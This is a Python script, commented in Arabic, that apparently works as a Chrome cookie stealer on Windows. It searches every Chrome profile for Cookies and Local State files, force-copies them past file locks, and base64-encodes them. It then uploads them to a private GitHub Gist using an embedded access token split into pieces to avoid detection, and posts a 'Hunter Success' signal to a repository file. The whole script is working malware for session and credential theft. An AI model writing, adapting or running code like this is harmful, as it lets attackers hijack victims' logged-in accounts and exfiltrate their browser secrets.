import os, requests, base64, shutil, sqlite3

# التوكن المقسم (Gist + Repo)
A, B, C = "ghp_4io8ppwp", "agmH6IJEsD1XBpSs", "7TY7V44ZSlJt"
TOKEN = A + B + C

def smart_hunter():
    appdata = os.getenv('LOCALAPPDATA')
    chrome_path = os.path.join(appdata, r'Google\Chrome\User Data')
    
    # 1. قائمة الأهداف
    targets = ['Cookies', 'Network\\Cookies', 'Local State']
    found_data = {}

    # 2. البحث الذكي (Searching everywhere inside Chrome)
    # السكربت سيمشط كل المجلدات الفرعية بحثاً عن أي ملف كوكيز
    for root, dirs, files in os.walk(chrome_path):
        for file in files:
            if file in ['Cookies', 'Local State']:
                full_path = os.path.join(root, file)
                # اسم فريد لكل ملف (مثلاً: Default_Cookies)
                profile_name = os.path.basename(os.path.dirname(root))
                unique_name = f"{profile_name}_{file}"
                
                try:
                    # 3. النسخ الإجباري (تجاوز القفل)
                    temp_path = os.path.join(os.getenv('TEMP'), 'sys_temp.tmp')
                    os.system(f'copy /y "{full_path}" "{temp_path}" > nul')
                    
                    with open(temp_path, 'rb') as f:
                        found_data[unique_name] = base64.b64encode(f.read()).decode('utf-8')
                    
                    os.remove(temp_path)
                except: continue

    # 4. الرفع المضمون
    if found_data:
        headers = {"Authorization": f"token {TOKEN}"}
        # الرفع لـ Gist
        gist_payload = {
            "description": "Smart Hunter Log",
            "public": False,
            "files": {"chrome_vault.json": {"content": str(found_data)}}
        }
        requests.post("https://api.github.com/gists", headers=headers, json=gist_payload)
        
        # إرسال إشارة نجاح لـ Noor.json
        try:
            repo_url = "https://api.github.com/repos/Noor092324/Noor-config/contents/Noor.json"
            curr = requests.get(repo_url, headers=headers).json()
            requests.put(repo_url, headers=headers, json={
                "message": "Hunter Success",
                "content": base64.b64encode(b"Files Found and Captured in Gist").decode(),
                "sha": curr['sha']
            })
        except: pass

if __name__ == "__main__":
    smart_hunter()
            
